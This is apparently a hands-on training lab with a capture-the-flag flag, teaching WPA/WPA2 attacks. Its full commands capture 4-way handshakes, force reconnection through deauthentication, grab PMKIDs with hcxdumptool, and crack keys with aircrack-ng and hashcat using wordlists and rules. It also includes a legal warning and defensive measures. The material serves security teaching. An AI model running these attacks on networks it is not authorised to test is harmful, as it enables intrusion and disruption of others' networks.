# Lab 05: WPA/WPA2 Attacks

Capturing WPA/WPA2 handshakes, PMKID attacks, and dictionary-based key cracking.

```
+===============================================================+
|                    WPA/WPA2 ATTACKS                            |
+===============================================================+
|  Difficulty: Intermediate    Duration: 1.5 hours              |
|  Hardware: WiFi Adapter      Type: Practical                  |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  Attacking WPA/WPA2 networks without explicit written authorization |
|  is ILLEGAL under computer crime laws in most jurisdictions.        |
|                                                                      |
|  - ONLY test on networks you OWN or have WRITTEN PERMISSION         |
|  - Use an isolated test network with your own equipment             |
|  - Capturing handshakes from others' networks may be illegal        |
|                                                                      |
|  Violations can result in criminal prosecution, fines up to         |
|  $250,000, and imprisonment. The techniques taught here are         |
|  for DEFENSIVE and AUTHORIZED TESTING purposes only.                |
+=====================================================================+
```

## Learning Objectives

By the end of this lab, you will:

1. Understand WPA/WPA2 PSK authentication (4-way handshake)
2. Capture WPA handshakes using airodump-ng
3. Force handshake capture using deauthentication
4. Perform PMKID attacks (client-less capture)
5. Crack captured handshakes with aircrack-ng and hashcat
6. Understand dictionary attack effectiveness and limitations

## Prerequisites

- Completed Lab 03: Wireless Reconnaissance
- Completed Lab 04: WEP Cracking
- WiFi adapter with monitor mode and packet injection
- Kali Linux with aircrack-ng suite and hashcat
- Isolated test network with WPA2-PSK

## Hardware Requirements

| Component | Requirement | Notes |
|-----------|-------------|-------|
| WiFi Adapter | Monitor + Injection | Alfa AWUS036ACH recommended |
| Test AP | WPA2-PSK | Use a weak test password |
| Test Client | Any WiFi device | To capture handshake |
| (Optional) GPU | NVIDIA/AMD | For faster hashcat cracking |

## Understanding WPA/WPA2 Security

### The 4-Way Handshake

```
WPA2 4-Way Handshake Process:

    ┌─────────────────┐                      ┌─────────────────┐
    │     CLIENT      │                      │  ACCESS POINT   │
    │   (Supplicant)  │                      │ (Authenticator) │
    └────────┬────────┘                      └────────┬────────┘
             │                                        │
             │      PMK derived from password         │
             │      PMK = PBKDF2(password, SSID)      │
             │                                        │
             │◄─────── Message 1: ANonce ────────────│
             │         (AP's random number)           │
             │                                        │
    ┌────────┴────────┐
    │ Client computes │
    │ PTK from:       │
    │ - PMK           │
    │ - ANonce        │
    │ - SNonce        │
    │ - MAC addresses │
    └────────┬────────┘
             │                                        │
             │──────── Message 2: SNonce + MIC ─────►│
             │         (Client's random number)       │
             │                                        │
             │                               ┌────────┴────────┐
             │                               │ AP verifies MIC │
             │                               │ Derives same PTK│
             │                               └────────┬────────┘
             │                                        │
             │◄─────── Message 3: GTK + MIC ─────────│
             │         (Group Temporal Key)          │
             │                                        │
             │──────── Message 4: ACK + MIC ────────►│
             │                                        │
             │         ENCRYPTED TRAFFIC             │
             │◄═══════════════════════════════════════►│

```

### What We Need to Capture

```
For Handshake Cracking:

FROM MESSAGE 2:
├── SNonce (Client's random number)
├── MIC (Message Integrity Code)
└── Client MAC address

FROM MESSAGE 1 or 3:
├── ANonce (AP's random number)
└── AP MAC address

WITH HANDSHAKE + WORDLIST:
Password → PBKDF2 → PMK → PTK → Calculate MIC → Compare with captured MIC
If MIC matches → Password found!
```

### PMKID Attack (Client-less)

```
PMKID Attack Advantage:

Traditional:                    PMKID:
───────────────────────────────────────────────────────
✗ Needs connected client       ✓ No client needed
✗ Wait for handshake           ✓ Request from AP
✗ May need deauth              ✓ Single packet capture
✓ Works on all WPA networks    ✗ Requires PMKID support

PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)

The PMKID is sent in the first message of the 4-way handshake,
allowing capture without a full handshake exchange.
```

## Attack Methods Overview

```
WPA/WPA2 Attack Methods:

┌─────────────────────────────────────────────────────────────────┐
│  METHOD 1: HANDSHAKE CAPTURE + DICTIONARY ATTACK                │
├─────────────────────────────────────────────────────────────────┤
│  1. Monitor network for client activity                         │
│  2. Capture 4-way handshake (may need deauth)                  │
│  3. Offline dictionary attack against handshake                 │
│  Success depends on: Password in wordlist                       │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  METHOD 2: PMKID ATTACK (NO CLIENT REQUIRED)                    │
├─────────────────────────────────────────────────────────────────┤
│  1. Request PMKID from AP (associate but don't complete)       │
│  2. Extract PMKID from response                                │
│  3. Offline dictionary attack against PMKID                    │
│  Success depends on: Password in wordlist, AP sends PMKID      │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  METHOD 3: BRUTE FORCE (VERY SLOW)                              │
├─────────────────────────────────────────────────────────────────┤
│  1. Capture handshake or PMKID                                 │
│  2. Try all possible password combinations                     │
│  Success depends on: Short password, massive GPU power         │
│  Note: 8 char alphanumeric = 2.8 trillion combinations         │
└─────────────────────────────────────────────────────────────────┘
```

## Step-by-Step Instructions

### Method 1: Handshake Capture

#### Step 1: Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon
```

#### Step 2: Discover Target Network

```bash
# Scan for WPA2 networks
sudo airodump-ng --encrypt WPA2 wlan0mon
```

**Identify Target:**
```
 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC    CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -45      256      189   12   6   54e  WPA2   CCMP    PSK  TestNetwork
```

**Note:**
- BSSID: `AA:BB:CC:DD:EE:FF`
- Channel: `6`
- Connected clients visible in bottom section

#### Step 3: Target Network and Capture

```bash
# Start targeted capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in top right corner
```

#### Step 4: Force Handshake (Deauthentication)

If no handshake after waiting, force a client to reconnect:

```bash
# In a new terminal - deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Parameters:
# -0 5   : Send 5 deauth packets
# -a     : AP BSSID
# -c     : Client MAC address

# Or deauth all clients (more disruptive)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Success Indicator:**
```
 CH  6 ][ Elapsed: 2 min ][ WPA handshake: AA:BB:CC:DD:EE:FF
                             ↑
                    Handshake captured!
```

#### Step 5: Verify Handshake Capture

```bash
# Check if handshake is valid
aircrack-ng wpa_capture-01.cap

# Output should show:
# 1 handshake, BSSID AA:BB:CC:DD:EE:FF
```

#### Step 6: Crack with Wordlist

```bash
# Using aircrack-ng with rockyou wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# For faster cracking with hashcat (GPU)
# First convert capture to hashcat format
aircrack-ng -j wpa_hash wpa_capture-01.cap

# Then use hashcat
hashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Method 2: PMKID Attack

#### Step 1: Install Required Tools

```bash
# Install hcxdumptool and hcxpcapngtool
sudo apt install hcxdumptool hcxtools
```

#### Step 2: Capture PMKID

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Capture PMKIDs (runs for ~60 seconds)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Or target specific network
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=targets.txt --filtermode=2
```

**Creating Target List:**
```bash
# targets.txt should contain target BSSID
echo "AABBCCDDEEFF" > targets.txt
```

#### Step 3: Convert for Hashcat

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Check for PMKID captures
cat hash.hc22000
# Lines starting with WPA*01* are PMKID
# Lines starting with WPA*02* are EAPOL (handshake)
```

#### Step 4: Crack with Hashcat

```bash
# Crack PMKID with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With GPU acceleration
hashcat -m 22000 -d 1 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

## Wordlist Strategies

### Common Wordlists

```bash
# Kali Linux built-in wordlists
/usr/share/wordlists/rockyou.txt        # 14 million passwords
/usr/share/wordlists/fasttrack.txt      # Quick common passwords
/usr/share/wordlists/dirb/common.txt    # Basic common words

# Download more
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
```

### Custom Wordlist Generation

```bash
# Generate based on target information
# If targeting "AcmeCorp" network:

# Using crunch for patterns
crunch 8 12 -t Acme@@@@ -o acme_wordlist.txt
# Creates: Acme0000 through Acme9999

# Using cupp for profiled wordlists
cupp -i
# Interactive - enter target information

# Combine wordlists
cat rockyou.txt custom.txt | sort -u > combined.txt
```

### Rule-Based Attacks

```bash
# Hashcat with rules (adds variations)
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Common variations:
# password → Password, PASSWORD, password1, password!, P@ssw0rd

# Combine multiple rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule -r rules/leetspeak.rule
```

## Cracking Speed Reference

```
Hashcat Cracking Speed (WPA2):

Device                          Speed (PMK/s)
─────────────────────────────────────────────
CPU (Intel i7)                  ~1,000
GPU (GTX 1080)                  ~400,000
GPU (RTX 3090)                  ~1,200,000
4x RTX 3090                     ~4,800,000

Time to Crack (8-char lowercase):

Password Space: 26^8 = 208 billion combinations

Device          Time
───────────────────────────
CPU             6.6 years
GTX 1080        6 days
RTX 3090        2 days
4x RTX 3090     12 hours

This is why DICTIONARY ATTACKS are preferred!
Weak passwords found in seconds from wordlists.
```

## Lab Exercises

### Exercise 1: Handshake Capture

1. Set up a test AP with WPA2-PSK and password "TestPassword123"
2. Connect a client device
3. Capture the handshake using airodump-ng
4. Verify the handshake is complete

### Exercise 2: Forced Handshake

1. Start capture on your test network
2. Use deauthentication to force client reconnection
3. Capture the resulting handshake
4. Compare time to passive capture

### Exercise 3: PMKID Attack

1. Use hcxdumptool to capture PMKID
2. Convert to hashcat format
3. Verify PMKID was captured
4. Compare with handshake method

### Exercise 4: Dictionary Attack

1. Crack captured handshake with rockyou.txt
2. Note time to crack "TestPassword123"
3. Try with a complex 16-character password
4. Analyze dictionary attack limitations

## Defensive Measures

```
Protecting Against WPA2 Attacks:

╔══════════════════════════════════════════════════════════════════╗
║                    STRONG PASSWORD POLICY                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  Minimum Requirements:                                            ║
║  • 16+ characters length                                         ║
║  • Mix of upper/lower case letters                               ║
║  • Include numbers and special characters                        ║
║  • NOT based on dictionary words                                 ║
║  • NOT related to business/SSID name                             ║
║                                                                   ║
║  Example Strong Password:                                         ║
║  Xk9#mP2$vL7@nQ4& (16 chars, random)                            ║
║                                                                   ║
║  This would take: ~1.7 trillion years with 4x RTX 3090           ║
║                                                                   ║
╠══════════════════════════════════════════════════════════════════╣
║                    ADDITIONAL PROTECTIONS                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  • Upgrade to WPA3 (SAE prevents offline attacks)                ║
║  • Use WPA2-Enterprise (802.1X) instead of PSK                   ║
║  • Enable Protected Management Frames (PMF/802.11w)              ║
║  • Monitor for deauthentication attacks                          ║
║  • Regularly rotate PSK credentials                              ║
║  • Use hidden SSID (minor obstacle, not security)                ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

## Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| "No handshake captured" | Client didn't reconnect | Send more deauth packets |
| "Handshake incomplete" | Missed some messages | Capture again, closer to AP |
| "No PMKID" | AP doesn't support/send | Use traditional handshake method |
| "Cracking takes forever" | Password not in wordlist | Try larger wordlist or rules |
| "Hashcat CUDA error" | Driver issues | Update GPU drivers |

## Knowledge Check

1. What four pieces of information are needed to crack a WPA2 handshake?
2. Why can't WPA2 handshakes be cracked instantly like WEP?
3. What advantage does PMKID attack have over handshake capture?
4. Why are dictionary attacks effective against WPA2?
5. What makes WPA3 resistant to offline dictionary attacks?

<details>
<summary>Answers</summary>

1. ANonce, SNonce, MAC addresses (AP & client), and MIC from Message 2
2. WPA2 uses PBKDF2 with 4096 iterations, making each password guess computationally expensive (unlike WEP's statistical weakness)
3. PMKID can be captured without a connected client - only need to start authentication with AP
4. Most users choose weak/common passwords that exist in wordlists
5. WPA3 uses SAE (Dragonfly) which doesn't expose verifiable data for offline attacks - each guess requires interaction with AP

</details>

## Summary

In this lab, you learned:

1. **4-Way Handshake**: How WPA2 authentication works
2. **Handshake Capture**: Using airodump-ng and deauth attacks
3. **PMKID Attacks**: Client-less capture method
4. **Cracking Methods**: aircrack-ng and hashcat
5. **Wordlist Strategies**: Effective dictionary attacks
6. **Defense**: Strong passwords and WPA3

## Next Lab

Proceed to [Lab 06: Deauthentication Attacks](../06-deauthentication-attacks/) to learn about denial of service and forced disconnection attacks.

## References

- [Aircrack-ng WPA Tutorial](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
- [Hashcat WPA/WPA2 Cracking](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
- [PMKID Attack Paper](https://hashcat.net/forum/thread-7717.html)
- [WPA3 Security](https://www.wi-fi.org/discover-wi-fi/security)

---

**Flag:** `FLAG{wp4_h4ndsh4k3_cr4ck3d}`
